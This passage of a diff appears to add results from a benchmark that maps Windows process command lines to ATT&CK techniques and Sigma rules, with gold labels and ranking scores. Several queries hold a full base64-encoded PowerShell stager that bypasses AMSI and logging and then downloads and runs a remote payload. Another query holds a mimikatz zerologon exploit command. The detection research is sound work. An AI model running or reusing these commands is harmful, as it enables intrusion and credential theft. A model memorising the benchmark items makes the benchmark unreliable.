ARQBUAFYAYQBsAHUARQAoACQATgBVAEwATAAsACgATgBlAHcALQBPAEIAagBFAGMAVAAgAEMAbwBMAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAGEAUwBIAFMARQB0AFsAUwBUAFIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUARgBdAC4AQQBzAHMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUARQAoACQAbgB1AGwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAEUAdAAuAFMARQByAHYAaQBDAGUAUABvAEkATgBUAE0AQQBuAGEARwBFAFIAXQA6ADoARQB4AFAAZQBjAHQAMQAwADAAQwBPAG4AdABpAG4AVQBlAD0AMAA7ACQARgA5ADQARQA9AE4AZQB3AC0ATwBiAEoARQBDAHQAIABTAFkAcwBUAEUATQAuAE4AZQBUAC4AVwBlAGIAQwBMAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAEkAYwBPAEQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAE8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBBAHMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAEUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABlAC4AUABSAE8AeABZAD0AWwBTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAdQBFAHMAdABdADoAOgBEAGUARgBBAFUATAB0AFcARQBCAFAAUgBPAFgAeQA7ACQARgA5ADQARQAuAFAAcgBPAFgAWQAuAEMAUgBlAEQAZQBuAHQASQBhAEwAUwAgAD0AIABbAFMAWQBTAFQAZQBNAC4ATgBlAHQALgBDAHIARQBkAGUATgBUAGkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAGUAZgBBAHUAbAB0AE4ARQB0AHcATwBSAGsAQwByAGUARABFAE4AdABpAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBTAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBDAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAFMAKAAnADMAKwBZAG0AYwBuACkAcwAwAHIAOAA9ACMAZAB4AFoANgA1ADsAfQBPACUAfABMAGwASABpAH4AZgB7AHoAQgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEYAOQA0AEUALgBIAGUAQQBEAGUAUgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEoAUQBPAEgAdQBEAEcAcgBOAEwARwBlAE8AUAB5AGwAPQBFADIASAB6AGoANgAxAGwAdQBpADcAaABXAE0AWQBRAGUANgAzAFcAVQB3AHMAMAB6AFoAOAA9ACIAKQA7ACQAZABhAHQAQQA9ACQAZgA5ADQARQAuAEQATwBXAG4ATABvAEEARABEAGEAdABhACgAJABzAGUAUgArACQAdAApADsAJABJAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAGQAYQBUAEEALgBsAGUAbgBHAFQASABdADsALQBqAG8ASQBOAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA== C:\\Windows\\System32\\wscript.exe \"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1059.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.6548086577531307,
+      "n_relevant": 155,
+      "top": [
+        "e9f55347-2928-4c06-88e5-1a7f8169942e",
+        "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "6385697e-9f1b-40bd-8817-f4a91f40508e",
+        "1228c958-e64e-4e71-92ad-7d429f4138ba",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-112",
+      "query": "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAYQBMAFUARQAoACQAbgBVAGwATAApADsASQBmACgAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMAbwBsAGwARQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAEMALgBEAEkAYwBUAEkATwBuAGEAcgBZAFsAUwB0AHIASQBuAGcALABTAFkAcwBUAEUAbQAuAE8AYgBKAEUAYwB0AF0AXQA6ADoAbgBlAHcAKAApADsAJABWAGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBhAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAdABCAGwATwBDAGsAXQAuACIARwBlAFQARgBJAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBsAHUARQAoACQATgBVAEwATAAsACgATgBlAHcALQBPAEIAagBFAGMAVAAgAEMAbwBMAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAGEAUwBIAFMARQB0AFsAUwBUAFIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUARgBdAC4AQQBzAHMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUARQAoACQAbgB1AGwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAEUAdAAuAFMARQByAHYAaQBDAGUAUABvAEkATgBUAE0AQQBuAGEARwBFAFIAXQA6ADoARQB4AFAAZQBjAHQAMQAwADAAQwBPAG4AdABpAG4AVQBlAD0AMAA7ACQARgA5ADQARQA9AE4AZQB3AC0ATwBiAEoARQBDAHQAIABTAFkAcwBUAEUATQAuAE4AZQBUAC4AVwBlAGIAQwBMAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAEkAYwBPAEQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAE8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBBAHMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAEUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABlAC4AUABSAE8AeABZAD0AWwBTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAdQBFAHMAdABdADoAOgBEAGUARgBBAFUATAB0AFcARQBCAFAAUgBPAFgAeQA7ACQARgA5ADQARQAuAFAAcgBPAFgAWQAuAEMAUgBlAEQAZQBuAHQASQBhAEwAUwAgAD0AIABbAFMAWQBTAFQAZQBNAC4ATgBlAHQALgBDAHIARQBkAGUATgBUAGkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAGUAZgBBAHUAbAB0AE4ARQB0AHcATwBSAGsAQwByAGUARABFAE4AdABpAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBTAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBDAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAFMAKAAnADMAKwBZAG0AYwBuACkAcwAwAHIAOAA9ACMAZAB4AFoANgA1ADsAfQBPACUAfABMAGwASABpAH4AZgB7AHoAQgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEYAOQA0AEUALgBIAGUAQQBEAGUAUgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEoAUQBPAEgAdQBEAEcAcgBOAEwARwBlAE8AUAB5AGwAPQBFADIASAB6AGoANgAxAGwAdQBpADcAaABXAE0AWQBRAGUANgAzAFcAVQB3AHMAMAB6AFoAOAA9ACIAKQA7ACQAZABhAHQAQQA9ACQAZgA5ADQARQAuAEQATwBXAG4ATABvAEEARABEAGEAdABhACgAJABzAGUAUgArACQAdAApADsAJABJAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAGQAYQBUAEEALgBsAGUAbgBHAFQASABdADsALQBqAG8ASQBOAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\nParentImage: C:\\Windows\\System32\\wscript.exe\nParentCommandLine: \"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1059.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.7227265726449519,
+      "n_relevant": 155,
+      "top": [
+        "18988e1b-9087-4f8a-82fe-0414dce49878",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "6385697e-9f1b-40bd-8817-f4a91f40508e",
+        "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-112",
+      "query": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAYQBMAFUARQAoACQAbgBVAGwATAApADsASQBmACgAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMAbwBsAGwARQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAEMALgBEAEkAYwBUAEkATwBuAGEAcgBZAFsAUwB0AHIASQBuAGcALABTAFkAcwBUAEUAbQAuAE8AYgBKAEUAYwB0AF0AXQA6ADoAbgBlAHcAKAApADsAJABWAGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBhAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAdABCAGwATwBDAGsAXQAuACIARwBlAFQARgBJAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBsAHUARQAoACQATgBVAEwATAAsACgATgBlAHcALQBPAEIAagBFAGMAVAAgAEMAbwBMAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAGEAUwBIAFMARQB0AFsAUwBUAFIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUARgBdAC4AQQBzAHMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUARQAoACQAbgB1AGwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAEUAdAAuAFMARQByAHYAaQBDAGUAUABvAEkATgBUAE0AQQBuAGEARwBFAFIAXQA6ADoARQB4AFAAZQBjAHQAMQAwADAAQwBPAG4AdABpAG4AVQBlAD0AMAA7ACQARgA5ADQARQA9AE4AZQB3AC0ATwBiAEoARQBDAHQAIABTAFkAcwBUAEUATQAuAE4AZQBUAC4AVwBlAGIAQwBMAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAEkAYwBPAEQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAE8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBBAHMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAEUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABlAC4AUABSAE8AeABZAD0AWwBTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAdQBFAHMAdABdADoAOgBEAGUARgBBAFUATAB0AFcARQBCAFAAUgBPAFgAeQA7ACQARgA5ADQARQAuAFAAcgBPAFgAWQAuAEMAUgBlAEQAZQBuAHQASQBhAEwAUwAgAD0AIABbAFMAWQBTAFQAZQBNAC4ATgBlAHQALgBDAHIARQBkAGUATgBUAGkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAGUAZgBBAHUAbAB0AE4ARQB0AHcATwBSAGsAQwByAGUARABFAE4AdABpAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBTAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBDAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAFMAKAAnADMAKwBZAG0AYwBuACkAcwAwAHIAOAA9ACMAZAB4AFoANgA1ADsAfQBPACUAfABMAGwASABpAH4AZgB7AHoAQgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEYAOQA0AEUALgBIAGUAQQBEAGUAUgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEoAUQBPAEgAdQBEAEcAcgBOAEwARwBlAE8AUAB5AGwAPQBFADIASAB6AGoANgAxAGwAdQBpADcAaABXAE0AWQBRAGUANgAzAFcAVQB3AHMAMAB6AFoAOAA9ACIAKQA7ACQAZABhAHQAQQA9ACQAZgA5ADQARQAuAEQATwBXAG4ATABvAEEARABEAGEAdABhACgAJABzAGUAUgArACQAdAApADsAJABJAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAGQAYQBUAEEALgBsAGUAbgBHAFQASABdADsALQBqAG8ASQBOAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "technique",
+      "gold": [
+        "T1059.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1059.001",
+        "T1546.013",
+        "T1546.007",
+        "T1218.014",
+        "T1216.002"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-113",
+      "query": "C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe \"C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\" ",
+      "kind": "technique",
+      "gold": [
+        "T1210"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.014",
+        "T1218.003",
+        "T1204.004",
+        "T1204.002",
+        "T1202"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-113",
+      "query": "C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe \"C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1210"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 3,
+      "top": [
+        "c2b86e67-b880-4eec-b045-50bc98ef4844",
+        "1228c958-e64e-4e71-92ad-7d429f4138ba",
+        "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "7d6d30b8-5b91-4b90-a891-46cccaf29598"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-113",
+      "query": "Image: C:\\Windows\\System32\\cmd.exe\nCommandLine: \"cmd.exe\" /c C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit\nParentImage: C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\nParentCommandLine: \"C:\\Users\\pgustavo\\Desktop\\GruntHTTP.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1210"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 3,
+      "top": [
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "1228c958-e64e-4e71-92ad-7d429f4138ba",
+        "727454c0-d851-48b0-8b89-385611ab0704",
+        "dee0a7a3-f200-4112-a99b-952196d81e42",
+        "f53714ec-5077-420e-ad20-907ff9bb2958"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-113",
